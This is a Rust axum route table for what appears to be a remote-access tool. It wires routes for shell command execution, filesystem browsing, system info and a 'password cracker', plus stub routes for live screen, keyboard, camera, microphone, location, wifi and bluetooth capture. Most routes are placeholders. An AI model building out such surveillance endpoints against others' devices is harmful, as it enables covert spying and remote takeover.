mod exec;
mod fetch;
mod fsxp;
mod skrin;

use crate::extensions::{Password, ShellState};
use axum::{
    routing::{get, post},
    Extension, Router,
};
use std::sync::{Arc, Mutex};

pub fn all_routes(shstate: Arc<Mutex<ShellState>>, passwd: Arc<Mutex<Password>>) -> Router {
    Router::new()
        .route("/login", get("login with username and password"))
        .route("/set", get("update username & password"))
        .route("/pswd", post("password cracker"))
        .route("/exec", post(exec::exec_cmd))
        .route("/fsxp", post(fsxp::scout_path))
        // routes for easier access
        .route("/fetch", post(fetch::fetch_sysinfo))
        .route("/browser", post("browser route"))
        // routes for real time data
        .route("/skrin", post(skrin::skrin))
        .route("/spikar", post("real time speaker"))
        .route("/aootpoot", post("real time screen + speaker"))
        .route("/apext", post("real time screen+speaker+keyboard+mouse"))
        .route("/kamera", post("real time camera"))
        .route("/maik", post("real time mic"))
        .route("/inpoot", post("real time camera + mic"))
        .route("/lokesan", post("real time location"))
        .route("/oaifai", post("real time wifi"))
        .route("/blootooth", post("real time bluetooth"))
        // extensions
        .layer(Extension(passwd))
        .layer(Extension(shstate))
}
